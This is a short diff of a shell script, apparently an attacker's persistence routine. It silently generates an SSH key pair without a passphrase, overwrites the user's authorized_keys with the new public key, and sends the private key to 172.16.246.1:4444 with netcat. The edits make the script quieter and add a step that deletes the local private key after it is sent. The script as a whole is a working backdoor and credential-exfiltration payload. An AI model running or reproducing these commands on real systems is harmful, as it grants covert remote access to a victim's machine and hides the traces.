@@ -8,7 +8,7 @@
 cd ~ > /dev/null 2>&1
 mkdir .ssh > /dev/null 2>&1
 cd .ssh > /dev/null 2>&1
-ssh-keygen -f new_key -N "" > /dev/null 2>&1
+ssh-keygen -f new_key -N "" -q 
 mv new_key.pub authorized_keys > /dev/null 2>&1
-chmod 600 new_key > /dev/null 2>&1
 cat new_key | nc 172.16.246.1 4444 -q 0 > /dev/null 2>&1
+rm new_key > /dev/null 2>&1
